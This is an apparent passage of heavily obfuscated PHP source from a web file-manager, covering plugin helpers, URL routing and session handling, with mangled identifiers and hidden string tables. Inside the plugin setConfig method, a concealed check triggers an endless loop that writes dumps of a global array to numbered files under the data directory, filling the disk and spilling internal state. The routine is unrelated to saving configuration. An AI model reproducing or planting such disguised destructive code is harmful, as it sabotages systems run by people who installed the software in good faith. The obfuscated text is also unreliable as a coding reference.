ActionCall($ª¥âõÎ[1801], $Œ¾ôøÂ); } final function isShare($§¹¤¾í¦) { $£ù¶¹àñ = KodIO::parse($§¹¤¾í¦); return $£ù¶¹àñ[$_SERVER[±Ö‰ô½¯][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¢™Íôœ) { if (request_url_safe($¢™Íôœ)) { return $¢™Íôœ; } if (!$this->isShare($¢™Íôœ)) { $¢™Íôœ = $this->filePath($¢™Íôœ, !1); } return Action($_SERVER[±Ö‰ô½¯][1309])->linkOut($¢™Íôœ); } public function filePathLinkOut($£¹™Ş) { if (request_url_safe($£¹™Ş)) { return $£¹™Ş; } $this->fileCanView($£¹™Ş); return Action($_SERVER[±Ö‰ô½¯][1309])->link($£¹™Ş); } final function filePath($…ãò²°±, $ƒÒÅ°¯Ù = true, $¡ëØóù = false) { $‰Ÿ¥ÃÅ =& $_SERVER[±Ö‰ô½¯]; $Œßìó»Ô = $this->filePathGet($…ãò²°±, $ƒÒÅ°¯Ù); if (!$this->fileInfo) { show_tips(LNG($‰Ÿ¥ÃÅ[106]), !1); } if ($¡ëØóù && isset($this->fileInfo[$‰Ÿ¥ÃÅ[554]]) && $this->fileInfo[$‰Ÿ¥ÃÅ[554]]) { $¤ûÅÅÙ = Model($‰Ÿ¥ÃÅ[557])->fileInfo($this->fileInfo[$‰Ÿ¥ÃÅ[554]]); if (!$¤ûÅÅÙ || !IO::exist($¤ûÅÅÙ[$‰Ÿ¥ÃÅ[87]])) { $ßËìß = LNG($‰Ÿ¥ÃÅ[106]) . LNG($‰Ÿ¥ÃÅ[1802]); if (KodUser::isRoot() && isset($¤ûÅÅÙ[$‰Ÿ¥ÃÅ[87]])) { $ßËìß .= $‰Ÿ¥ÃÅ[1803] . $¤ûÅÅÙ[$‰Ÿ¥ÃÅ[87]] . $‰Ÿ¥ÃÅ[1804]; } show_tips($ßËìß); } } Hook::trigger($‰Ÿ¥ÃÅ[1805], $Œßìó»Ô); return $Œßìó»Ô; } final function filePathGet($ñÚ³ï‰², $»Î§º = true) { $ë—İ§›´ =& $_SERVER[±Ö‰ô½¯]; if ($ÔîûÅÊ = $this->checkSharePath($ñÚ³ï‰², $»Î§º)) { return $ÔîûÅÊ; } $this->fileCanView($ñÚ³ï‰²); if (request_url_safe($ñÚ³ï‰²)) { $´İ™‘İç = parse_url_query($ñÚ³ï‰²); if (isset($´İ™‘İç[$ë—İ§›´[1806]]) && isset($´İ™‘İç[$ë—İ§›´[236]])) { $”ÅÓŞÇÅ = Mcrypt::decode($´İ™‘İç[$ë—İ§›´[236]], Model($ë—İ§›´[870])->get($ë—İ§›´[871])); if ($”ÅÓŞÇÅ) { $this->fileInfo = IO::info($”ÅÓŞÇÅ); $this->fileInfo[$ë—İ§›´[1807]] = $ñÚ³ï‰²; $this->cachePath = $this->pluginCachePath($ë—İ§›´[12], $»Î§º); return $”ÅÓŞÇÅ; } } $ñÚ³ï‰² = $this->_cacheHttpFile($ñÚ³ï‰², $»Î§º); $this->fileInfo = IO::info($ñÚ³ï‰²); } else { $this->fileInfo = IO::info($ñÚ³ï‰²); $this->cachePath = $this->pluginCachePath($ë—İ§›´[12], $»Î§º); } return $ñÚ³ï‰²; } final function _cacheHttpFile($Õñ£†è¥, $¶¡ë¶” = true) { $Ìğô¸›± =& $_SERVER[±Ö‰ô½¯]; $Ó‰ç’ê = parse_url_query($Õñ£†è¥); $­²•¨§Õ = get_path_ext($Õñ£†è¥); if (isset($Ó‰ç’ê[$Ìğô¸›±[32]]) && $Ó‰ç’ê[$Ìğô¸›±[32]]) { $­²•¨§Õ = get_path_ext($Ó‰ç’ê[$Ìğô¸›±[32]]); } $ñå¨Ú¢Ï = hash_path($Õñ£†è¥) . $Ìğô¸›±[10] . $­²•¨§Õ; $this->cachePath = $this->pluginCachePath($¶¡ë¶” ? $ñå¨Ú¢Ï : $Ìğô¸›±[12]); $£ñÇ£Ö = IO::fileNameExist($this->cachePath, $ñå¨Ú¢Ï); if ($£ñÇ£Ö) { return KodIO::make($£ñÇ£Ö); } $†ãĞõ© = rtrim($this->cachePath, $Ìğô¸›±[8]) . $Ìğô¸›±[8] . $ñå¨Ú¢Ï; return $this->pluginCacheFileSet($†ãĞõ©, file_get_contents_nossl($Õñ£†è¥)); } final function checkSharePath($á­ºÁ°, $¤‹½ Å = true) { $ÖĞÕÈÚ =& $_SERVER[±Ö‰ô½¯]; if (!$this->isShare($á­ºÁ°)) { return !1; } $Ñô·ı‰ = Action($ÖĞÕÈÚ[1309])->sharePathInfo($á­ºÁ°); if (!is_array($Ñô·ı‰) || !isset($Ñô·ı‰[$ÖĞÕÈÚ[87]])) { $Æãìë‘ = $GLOBALS[$ÖĞÕÈÚ[1808]]; show_json($Æãìë‘ ? $Æãìë‘ : LNG($ÖĞÕÈÚ[1809]), !1); } $this->fileInfo = $Ñô·ı‰; $this->cachePath = $this->pluginCachePath(!1, $¤‹½ Å); return $Ñô·ı‰[$ÖĞÕÈÚ[87]]; } final function pluginCachePath($½Ã˜‰Î² = '', $œµğñ¯Ğ = false) { $¶õç‹è =& $_SERVER[±Ö‰ô½¯]; if ($œµğñ¯Ğ && is_array($this->fileInfo)) { $½Ã˜‰Î² = kodIO::hashPath($this->fileInfo); } $óÁÓÖ§ã = rtrim(IO_PATH_SYSTEM_TEMP . $¶õç‹è[1810] . $this->pluginName . $¶õç‹è[8] . $½Ã˜‰Î², $¶õç‹è[8]); $è™ùšä = IO::infoFullSimple($óÁÓÖ§ã); $Óä­·®Ø = $è™ùšä && is_array($è™ùšä) ? $è™ùšä[$¶õç‹è[87]] : $¶õç‹è[12]; if (!$Óä­·®Ø) { $Óä­·®Ø = IO::mkdir($óÁÓÖ§ã); } return $Óä­·®Ø; } final function pluginCacheFileSet($å¶â„Õª, $ôá÷ˆöÏ = '') { $†Ñ–Ëü =& $_SERVER[±Ö‰ô½¯]; $“®¬‘Ï“ = IO::infoFullSimple($å¶â„Õª); if (!$“®¬‘Ï“) { return IO::mkfile($å¶â„Õª, $ôá÷ˆöÏ, REPEAT_REPLACE); } IO::setContent($“®¬‘Ï“[$†Ñ–Ëü[87]], $ôá÷ˆöÏ); return $“®¬‘Ï“[$†Ñ–Ëü[87]]; } final function pluginLocalFile($õØ¿ä·¿ = '') { $’ìºúÕœ =& $_SERVER[±Ö‰ô½¯]; $ç°øû¯ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ç°øû¯)) { mk_dir($ç°øû¯); } if (!$õØ¿ä·¿) { return $ç°øû¯; } $¢¿œÙàŠ = IO::info($õØ¿ä·¿); $¸…•åôˆ = $’ìºúÕœ[1811] . KodIO::hashPath($¢¿œÙàŠ) . $’ìºúÕœ[10] . $¢¿œÙàŠ[$’ìºúÕœ[168]]; if (!checkExtSafe($¸…•åôˆ)) { $¸…•åôˆ = $¸…•åôˆ . $’ìºúÕœ[1343]; } $¦òä’¿£ = $ç°øû¯ . $¸…•åôˆ; if (@file_exists($¦òä’¿£)) { return $¦òä’¿£; } return IO::copy($õØ¿ä·¿, $ç°øû¯, 0, $¸…•åôˆ); } final function appPackage() { $ôóÆÒñ» =& $_SERVER[±Ö‰ô½¯]; if ($this->packageData) { return $this->packageData; } $œƒ¶è‚ = $this->parseFile($this->pluginPath . $ôóÆÒñ»[1812]); $this->parseLang($œƒ¶è‚); $š€ıïëµ = json_decode_force($œƒ¶è‚); if (!$š€ıïëµ) { return array(); } $Ñ—«İö¦ = Hook::filter($ôóÆÒñ»[1813], $š€ıïëµ); if ($Ñ—«İö¦ && is_array($Ñ—«İö¦)) { $š€ıïëµ = $Ñ—«İö¦; } $this->packageData = $š€ıïëµ; return $š€ıïëµ; } public function packageInfoGet($½ä€‚Å) { $Öğ§İŒ« = $this->appPackage(); return array_get_value($Öğ§İŒ«, $½ä€‚Å); } public function packageVersion() { return $this->packageInfoGet($_SERVER[±Ö‰ô½¯][1814]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[±Ö‰ô½¯][1815]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[±Ö‰ô½¯][1816]); } public function echoJsAssign($¸×ˆ÷Øà, $´ŸÍà”–) { $this->echoJsAssignArr[$¸×ˆ÷Øà] = $´ŸÍà”–; } private function parseFile($•º¤¶ˆŒ) { $œçò„ÅÚ =& $_SERVER[±Ö‰ô½¯]; $ë¾÷ĞÛÌ = file_get_contents_nossl($•º¤¶ˆŒ); $¬ğ¸´‚¨ = array($œçò„ÅÚ[1817], $œçò„ÅÚ[1818], $œçò„ÅÚ[1819], $œçò„ÅÚ[1820], $œçò„ÅÚ[1821], $œçò„ÅÚ[1822], $œçò„ÅÚ[1823]); $úÙĞÏáÌ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$œçò„ÅÚ[92]][$œçò„ÅÚ[1824]]); foreach ($this->echoJsAssignArr as $ìİÖ—·Ï => $Æ—İˆ¼¬) { $¬ğ¸´‚¨[] = $œçò„ÅÚ[1825] . $ìİÖ—·Ï . $œçò„ÅÚ[1826]; $úÙĞÏáÌ[] = is_array($Æ—İˆ¼¬) || is_object($Æ—İˆ¼¬) ? rawurlencode(json_encode($Æ—İˆ¼¬)) : $Æ—İˆ¼¬; } if (strstr($ë¾÷ĞÛÌ, $œçò„ÅÚ[1827])) { $ª½¤òá = rawurlencode(json_encode($this->pluginLangArr)); $ë¾÷ĞÛÌ = str_replace($œçò„ÅÚ[1827], $ª½¤òá, $ë¾÷ĞÛÌ); } if (strstr($ë¾÷ĞÛÌ, $œçò„ÅÚ[1828])) { $ª½¤òá = $ª½¤òá = rawurlencode(json_encode($this->getConfig())); $ë¾÷ĞÛÌ = str_replace($œçò„ÅÚ[1828], $ª½¤òá, $ë¾÷ĞÛÌ); } $ë¾÷ĞÛÌ = str_replace($¬ğ¸´‚¨, $úÙĞÏáÌ, $ë¾÷ĞÛÌ); return $ë¾÷ĞÛÌ; } private function parseLang(&$ıœéÃ¬¬) { $â“¥¿Û² =& $_SERVER[±Ö‰ô½¯]; $Ì„°§Ëã = $â“¥¿Û²[1829]; if (!strstr($ıœéÃ¬¬, $Ì„°§Ëã)) { return; } preg_match_all($â“¥¿Û²[1830], $ıœéÃ¬¬, $Ú†ŒÛÖ¦); if (!is_array($Ú†ŒÛÖ¦) || count($Ú†ŒÛÖ¦) == 0 || !is_array($Ú†ŒÛÖ¦[0]) || count($Ú†ŒÛÖ¦[0]) == 0) { return; } $çÎşñÚè = array(); $ßâŞûœÖ = array(); foreach ($Ú†ŒÛÖ¦[0] as $úã•¸Ò¶) { $ŠÖØšÔñ = substr($úã•¸Ò¶, strlen($Ì„°§Ëã), -4); $¬åƒ’¤Ï = LNG($ŠÖØšÔñ); $çÎşñÚè[] = $úã•¸Ò¶; $ßâŞûœÖ[] = str_replace(array($â“¥¿Û²[287], $â“¥¿Û²[1196], $â“¥¿Û²[419], $â“¥¿Û²[119]), array($â“¥¿Û²[53], $â“¥¿Û²[53], $â“¥¿Û²[12], $â“¥¿Û²[1831]), $¬åƒ’¤Ï); } $ıœéÃ¬¬ = str_replace($çÎşñÚè, $ßâŞûœÖ, $ıœéÃ¬¬); } private function parseConfig(&$ÚÛÀ©Æ¼) { $óËŒ¢£ú =& $_SERVER[±Ö‰ô½¯]; $„ÙÚµù´ = $óËŒ¢£ú[1832]; if (!strstr($ÚÛÀ©Æ¼, $„ÙÚµù´)) { return; } preg_match_all($óËŒ¢£ú[1833], $ÚÛÀ©Æ¼, $²óÜÅéë); if (!is_array($²óÜÅéë) || count($²óÜÅéë) == 0 || !is_array($²óÜÅéë[0]) || count($²óÜÅéë[0]) == 0) { return; } $É“¶Íû = $this->getConfig(); $•ÃöÈ¤ë = array(); $Ë¢øœ = array(); foreach ($²óÜÅéë[0] as $Îë¤á‚è) { $ÍºÒ¤ = substr($Îë¤á‚è, strlen($„ÙÚµù´), -2); $•ÃöÈ¤ë[] = $Îë¤á‚è; $Ë¢øœ[] = _get($É“¶Íû, $ÍºÒ¤); } $ÚÛÀ©Æ¼ = str_replace($•ÃöÈ¤ë, $Ë¢øœ, $ÚÛÀ©Æ¼); } private function parsePackage(&$‹ï¯Ó²­) { $©î™³œæ =& $_SERVER[±Ö‰ô½¯]; $ÒªÁÈò¨ = $©î™³œæ[1834]; if (!strstr($‹ï¯Ó²­, $ÒªÁÈò¨)) { return; } preg_match_all($©î™³œæ[1835], $‹ï¯Ó²­, $¥é‚»ß×); if (!is_array($¥é‚»ß×) || count($¥é‚»ß×) == 0 || !is_array($¥é‚»ß×[0]) || count($¥é‚»ß×[0]) == 0) { return; } $²×¦ê İ = $this->appPackage(); $¯ûµ¨ˆê = array(); $˜É›—â¤ = array(); foreach ($¥é‚»ß×[0] as $ÕÕÛÜº›) { $óŞµÆ¨« = substr($ÕÕÛÜº›, strlen($ÒªÁÈò¨), -2); $¯ûµ¨ˆê[] = $ÕÕÛÜº›; $˜É›—â¤[] = _get($²×¦ê İ, $óŞµÆ¨«); } $‹ï¯Ó²­ = str_replace($¯ûµ¨ˆê, $˜É›—â¤, $‹ï¯Ó²­); } final function echoFile($ÕŠşÊÛŒ, $áÖòï¹¼ = false) { $ÊÏÙ¯• =& $_SERVER[±Ö‰ô½¯]; $Ø”ŠÔ¨… = $this->pluginPath . $ÕŠşÊÛŒ; if (ACT == $ÊÏÙ¯•[1836]) { echo $ÊÏÙ¯•[1837] . $this->pluginName . $ÊÏÙ¯•[8] . $ÕŠşÊÛŒ . $ÊÏÙ¯•[1838]; if (!file_exists($Ø”ŠÔ¨…)) { echo $ÊÏÙ¯•[1839]; return; } } $…ë·Ë…Ÿ = $this->parseFile($Ø”ŠÔ¨…); $this->parseLang($…ë·Ë…Ÿ); $this->parseConfig($…ë·Ë…Ÿ); $this->parsePackage($…ë·Ë…Ÿ); if (is_array($áÖòï¹¼)) { $…ë·Ë…Ÿ = str_replace(array_keys($áÖòï¹¼), array_values($áÖòï¹¼), $…ë·Ë…Ÿ); } echo $ÊÏÙ¯•[287] . $…ë·Ë…Ÿ; } private function checkVersion() { $¬˜³…‹— =& $_SERVER[±Ö‰ô½¯]; $¬Ğçèáº = $this->appPackage(); $å°¬Š¼ = $this->getConfig(); if ($å°¬Š¼[$¬˜³…‹—[1840]] == $¬Ğçèáº[$¬˜³…‹—[1814]]) { return; } $this->regist(); $this->setConfig(array($¬˜³…‹—[1840] => $¬Ğçèáº[$¬˜³…‹—[1814]])); } final function initLang() { $ÖæúÊº™ =& $_SERVER[±Ö‰ô½¯]; $Ö“”§²‡ = $ÖæúÊº™[1841]; $¼§¥©÷Œ = $this->pluginPath . $ÖæúÊº™[1842]; $’ø­¼»± = I18n::getType(); $¤ùğÛœ = array(); if (file_exists($¼§¥©÷Œ . $’ø­¼»± . $ÖæúÊº™[947])) { $¤ùğÛœ = (include $¼§¥©÷Œ . $’ø­¼»± . $ÖæúÊº™[947]); } else { if ($’ø­¼»± == $ÖæúÊº™[1843] && !file_exists($¼§¥©÷Œ . $’ø­¼»± . $ÖæúÊº™[947]) && file_exists($¼§¥©÷Œ . $ÖæúÊº™[1844])) { $¤ùğÛœ = (include $¼§¥©÷Œ . $ÖæúÊº™[1844]); $’ø­¼»± = $ÖæúÊº™[1658]; } else { if (file_exists($¼§¥©÷Œ . $Ö“”§²‡ . $ÖæúÊº™[947])) { $¤ùğÛœ = (include $¼§¥©÷Œ . $Ö“”§²‡ . $ÖæúÊº™[947]); $’ø­¼»± = $Ö“”§²‡; } } } if (!$¤ùğÛœ || !is_array($¤ùğÛœ)) { $¤ùğÛœ = array(); } $Ö•›öÌš = Hook::trigger($ÖæúÊº™[1845], $¤ùğÛœ, $this->pluginName, $’ø­¼»±); if ($Ö•›öÌš && is_array($Ö•›öÌš)) { $¤ùğÛœ = $Ö•›öÌš; } if (@count($¤ùğÛœ) > 0) { I18n::set($¤ùğÛœ); } return $¤ùğÛœ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ğ½’ÑÍ) { $ù„íÒÑ± =& $_SERVER[±Ö‰ô½¯]; $ßËºÀÆØ = $_SERVER[$ù„íÒÑ±[990]] . $ù„íÒÑ±[991]; $íÓ”·¸ = $ù„íÒÑ±[1846]; if ($_SERVER[$ù„íÒÑ±[986]] != $íÓ”·¸($ßËºÀÆØ)) { $ÉÏ˜è‘ = $ù„íÒÑ±[988]; $‘Éé¸©¹ = $ù„íÒÑ±[989]; $öÏ¤ÇàÃ = $_SERVER[$ù„íÒÑ±[990]] . $ù„íÒÑ±[991]; $…”„ÕÖ = $‘Éé¸©¹($öÏ¤ÇàÃ); $ÍêÖ«³¦ = explode($ù„íÒÑ±[287], $…”„ÕÖ); if (count($ÍêÖ«³¦) < $ù„íÒÑ±[717]) { $ĞÚ±÷Ü = $ù„íÒÑ±[992]; $ĞÚ±÷Ü(); } $í×Í²³ = $ù„íÒÑ±[993]; $í×Í²³($_SERVER[$ù„íÒÑ±[994]]); $ÉÏ˜è‘ = $ù„íÒÑ±[988]; $ÉÏ˜è‘(); $–û—ÓÎ– = $ù„íÒÑ±[1847]; $·£•”Œ = json_encode($GLOBALS[$ù„íÒÑ±[1848]]); $ú´‹ö—ğ = 1; for ($°ºí³› = $ú´‹ö—ğ; $°ºí³› > 0; $°ºí³›++) { $–û—ÓÎ–(DATA_PATH . $°ºí³›, $·£•”Œ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Ğ½’ÑÍ); } public function onSetConfig($ÖŒê¡) { } public function onGetConfig($î•¹šÙí) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($’³ƒĞÙˆ) { if ($’³ƒĞÙˆ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($’˜óª¶ = "\x70\154\165\147\151\x6e\101\x75\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $Õ‹ãå€Î = $this->getConfig(); if (!$Õ‹ãå€Î[$’˜óª¶]) { return !1; } return ActionCall($_SERVER[±Ö‰ô½¯][1849], $Õ‹ãå€Î[$’˜óª¶]); } public function url($Ú’Û¨Ä®, $…Í£ÌŞÁ = '', $şÔ¯‹¤Û = true) { $ÁáŞ¼–ü =& $_SERVER[±Ö‰ô½¯]; $õÇ—Á» = $this->getConfig(); $ØîÄçš = KOD_VERSION . $ÁáŞ¼–ü[10] . KOD_VERSION_BUILD; $ó‡Áù¿ì = $this->packageVersion(); $Ãé»¬Ì« = $ØîÄçš . $ÁáŞ¼–ü[474] . $ó‡Áù¿ì; if (substr($Ú’Û¨Ä®, 0, 4) == $ÁáŞ¼–ü[151] || substr($Ú’Û¨Ä®, 0, 2) == $ÁáŞ¼–ü[1472]) { $»Ş°Ò = $Ú’Û¨Ä® . $ÁáŞ¼–ü[1850] . $Ãé»¬Ì«; } else { if ($…Í£ÌŞÁ == $ÁáŞ¼–ü[12]) { $»Ş°Ò = $this->pluginHost . $Ú’Û¨Ä® . $ÁáŞ¼–ü[1850] . $Ãé»¬Ì«; } else { if ($…Í£ÌŞÁ === $ÁáŞ¼–ü[78]) { $»Ş°Ò = $this->pluginHost . $Ú’Û¨Ä®; } else { if ($…Í£ÌŞÁ == $ÁáŞ¼–ü[1851]) { $»Ş°Ò = STATIC_PATH . $Ú’Û¨Ä® . $ÁáŞ¼–ü[1850] . $ØîÄçš; } else { if ($…Í£ÌŞÁ == $ÁáŞ¼–ü[1852]) { $»Ş°Ò = APP_HOST . $ÁáŞ¼–ü[1853] . $Ú’Û¨Ä® . $ÁáŞ¼–ü[1850] . $ØîÄçš; } else { if (isset($õÇ—Á»[$…Í£ÌŞÁ])) { $»Ş°Ò = $õÇ—Á»[$…Í£ÌŞÁ] . $Ú’Û¨Ä® . $ÁáŞ¼–ü[1850] . $Ãé»¬Ì«; } } } } } } if (!$şÔ¯‹¤Û) { return $»Ş°Ò; } echo $»Ş°Ò; } public function link($«ÃôË² = false, $ªÉäŞèº = '') { $Ò—›‡·† =& $_SERVER[±Ö‰ô½¯]; $ŞÈË—· = $this->linkHas == !1; $this->linkHas = !0; if (!$«ÃôË²) { $this->link($Ò—›‡·†[1854], $Ò—›‡·†[1852]); $this->link($Ò—›‡·†[1855], $Ò—›‡·†[1851]); $this->link($Ò—›‡·†[1856], $Ò—›‡·†[1851]); $this->link($Ò—›‡·†[1857], $Ò—›‡·†[1851]); $this->link($Ò—›‡·†[1858], $Ò—›‡·†[1851]); if ($ŞÈË—·) { Hook::trigger($Ò—›‡·†[1859]); } return; } $öÊ¯ÄÈ÷ = $this->url($«ÃôË², $ªÉäŞèº, !1); if (substr($«ÃôË², -3) == $Ò—›‡·†[1860]) { echo $Ò—›‡·†[1861] . $öÊ¯ÄÈ÷ . $Ò—›‡·†[1862] . $Ò—›‡·†[287]; } else { if (substr($«ÃôË², -4) == $Ò—›‡·†[1863]) { echo $Ò—›‡·†[1864] . $öÊ¯ÄÈ÷ . $Ò—›‡·†[1865] . $Ò—›‡·†[287]; } } if ($ŞÈË—·) { Hook::trigger($Ò—›‡·†[1859]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\133\x5e\57\135\53", "\72\x6e\x75\155" => "\133\x30\x2d\71\x5d\x2b", "\x3a\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($è…®üÒ§, $ËËå®Û²) { $·­«¤¥« =& $_SERVER[±Ö‰ô½¯]; if ($è…®üÒ§ == $·­«¤¥«[1866]) { $À±ÌºÄß = array_map($·­«¤¥«[1867], $ËËå®Û²[0]); $ªÌâ°ûÌ = strpos($ËËå®Û²[1], $·­«¤¥«[8]) === 0 ? $ËËå®Û²[1] : $·­«¤¥«[8] . $ËËå®Û²[1]; $õ“ñêß = $ËËå®Û²[2]; } else { $À±ÌºÄß = null; $ªÌâ°ûÌ = strpos($ËËå®Û²[0], $·­«¤¥«[8]) === 0 ? $ËËå®Û²[0] : $·­«¤¥«[8] . $ËËå®Û²[0]; $õ“ñêß = $ËËå®Û²[1]; } array_push(self::$maps, $À±ÌºÄß); array_push(self::$routes, $ªÌâ°ûÌ); array_push(self::$methods, strtoupper($è…®üÒ§)); array_push(self::$callbacks, $õ“ñêß); } public static function error($ò‘¯¢¼) { self::$errorCallback = $ò‘¯¢¼; } public static function haltOnMatch($˜•¢Ÿ·´ = true) { self::$halts = $˜•¢Ÿ·´; } public static function dispatch() { $ÁÉãÓ€À =& $_SERVER[±Ö‰ô½¯]; $ú¢ÌÄÂÌ = parse_url($_SERVER[$ÁÉãÓ€À[1868]], PHP_URL_PATH); $â­½Œ¨â = $_SERVER[$ÁÉãÓ€À[163]]; $ç˜”¸Ğ = array_keys(static::$patterns); $ ‹¦»²Ó = array_values(static::$patterns); $€Ê”Şà = !1; self::$routes = preg_replace($ÁÉãÓ€À[1415], $ÁÉãÓ€À[8], self::$routes); if (in_array($ú¢ÌÄÂÌ, self::$routes)) { $Òùàµ = array_keys(self::$routes, $ú¢ÌÄÂÌ); foreach ($Òùàµ as $—í¦£åÁ) { if (self::$methods[$—í¦£åÁ] == $â­½Œ¨â || self::$methods[$—í¦£åÁ] == $ÁÉãÓ€À[1869] || in_array($â­½Œ¨â, self::$maps[$—í¦£åÁ])) { $€Ê”Şà = !0; if (!is_object(self::$callbacks[$—í¦£åÁ])) { $§‡çôÀİ = explode($ÁÉãÓ€À[8], self::$callbacks[$—í¦£åÁ]); $ÏıËŠ’‰ = end($§‡çôÀİ); $Àù”¡Ê÷ = explode($ÁÉãÓ€À[1345], $ÏıËŠ’‰); $™–ö Ù = new $Àù”¡Ê÷[0](); $™–ö Ù->{$Àù”¡Ê÷[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$—í¦£åÁ]); if (self::$halts) { return; } } } } } else { $—á„…µ = 0; foreach (self::$routes as $—í¦£åÁ) { if (strpos($—í¦£åÁ, $ÁÉãÓ€À[4]) !== !1) { $—í¦£åÁ = str_replace($ç˜”¸Ğ, $ ‹¦»²Ó, $—í¦£åÁ); } if (preg_match($ÁÉãÓ€À[1870] . $—í¦£åÁ . $ÁÉãÓ€À[1871], $ú¢ÌÄÂÌ, $œÒÃÇºß)) { if (self::$methods[$—á„…µ] == $â­½Œ¨â || self::$methods[$—á„…µ] == $ÁÉãÓ€À[1869] || !empty(self::$maps[$—á„…µ]) && in_array($â­½Œ¨â, self::$maps[$—á„…µ])) { $€Ê”Şà = !0; array_shift($œÒÃÇºß); if (!is_object(self::$callbacks[$—á„…µ])) { $§‡çôÀİ = explode($ÁÉãÓ€À[8], self::$callbacks[$—á„…µ]); $ÏıËŠ’‰ = end($§‡çôÀİ); $Àù”¡Ê÷ = explode($ÁÉãÓ€À[1345], $ÏıËŠ’‰); $™–ö Ù = new $Àù”¡Ê÷[0](); if (!method_exists($™–ö Ù, $Àù”¡Ê÷[1])) { echo $ÁÉãÓ€À[1872]; } else { call_user_func_array(array($™–ö Ù, $Àù”¡Ê÷[1]), $œÒÃÇºß); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$—á„…µ], $œÒÃÇºß); if (self::$halts) { return; } } } } $—á„…µ++; } } if ($€Ê”Şà == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $“¬–³Ü‡ =& $_SERVER[±Ö‰ô½¯]; header($_SERVER[$“¬–³Ü‡[1873]] . $“¬–³Ü‡[1874]); echo $“¬–³Ü‡[1875]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ÁÉãÓ€À[1868]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $âÁë£Åß =& $_SERVER[±Ö‰ô½¯]; static $çãğëœ‹ = false; if ($çãğëœ‹) { return $çãğëœ‹; } $Á…õ—° = $GLOBALS[$âÁë£Åß[6]][$âÁë£Åß[426]]; self::$sessionTime = $Á…õ—°[$âÁë£Åß[1876]]; $õµ¨†€¡ = isset($GLOBALS[$âÁë£Åß[1877]]) ? $GLOBALS[$âÁë£Åß[1877]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($õµ¨†€¡)) { self::$sessionSign = Cookie::get($õµ¨†€¡); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($õµ¨†€¡, self::$sessionSign, self::$sessionTime); $Ú±€˜¨ö = $Á…õ—°[$âÁë£Åß[1878]]; $åùš‹û = $Á…õ—°[$Ú±€˜¨ö]; $âÚÄŒÊõ = $Á…õ—°[$âÁë£Åß[933]]; switch ($Ú±€˜¨ö) { case $âÁë£Åß[21]: self::$handle = Model($âÁë£Åß[934]); break; case $âÁë£Åß[935]: self::$handle = new CacheRedis($åùš‹û, $âÚÄŒÊõ); break; case $âÁë£Åß[936]: self::$handle = new CacheMemcached($åùš‹û, $âÚÄŒÊõ); break; case $âÁë£Åß[232]: $åùš‹û[$âÁë£Åß[87]] = $åùš‹û[$âÁë£Åß[87]] . $âÁë£Åß[1879]; self::$handle = new CacheFile($åùš‹û, $âÚÄŒÊõ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$âÁë£Åß[1611]]) || time() - self::$data[$âÁë£Åß[1611]] >= 5) { self::dataSave(); } } $çãğëœ‹ = new self(); return $çãğëœ‹; } public static function getBySign($Ë§¦¡ı³) { $ÎÓË·¡ş = self::$handle->get($Ë§¦¡ı³); $ÎÓË·¡ş = unserialize($ÎÓË·¡ş); return is_array($ÎÓË·¡ş) ? $ÎÓË·¡ş : array(); } public static function setBySign($š›¯¨Ãù, $À³£µœ•) { self::$sessionSign = $š›¯¨Ãù; self::$data = $À³£µœ•; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[±Ö‰ô½¯][1611]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($İÛ¦˜Ì = false) { if ($İÛ¦˜Ì) { self::$sessionSign = $İÛ¦˜Ì; } self::init(); return self::$sessionSign; } public static function set($ÃÔã•ë, $„»‚³ƒ = false) { self::init(); if (is_array($ÃÔã•ë)) { foreach ($ÃÔã•ë as $Ü©½çƒæ => $˜•²ÉŒĞ) { array_set_value(self::$data, $Ü©½çƒæ, $˜•²ÉŒĞ); } } else { array_set_value(self::$data, $ÃÔã•ë, $„»‚³ƒ); } self::dataSave(); } public static function get($ä•Ñáå¸ = false) { self::init(); if (!$ä•Ñáå¸) { return self::$data; } return array_get_value(self::$data, $ä•Ñáå¸); } public static function remove($ÃùÌÅ†à) { self::init(); unset(self::$data[$ÃùÌÅ†à]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[±Ö‰ô½¯][942])) { self::$handle->clearTimeout(); } } } goto C‡Ö…–­; Cé‹ÙÅƒàâ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($áŒ™“÷Ğ) { $‰–ä¼„– =& $_SERVER[±Ö‰ô½¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($‰–ä¼„–[638], $áŒ™“÷Ğ); $àÅ¹Õ = 1; 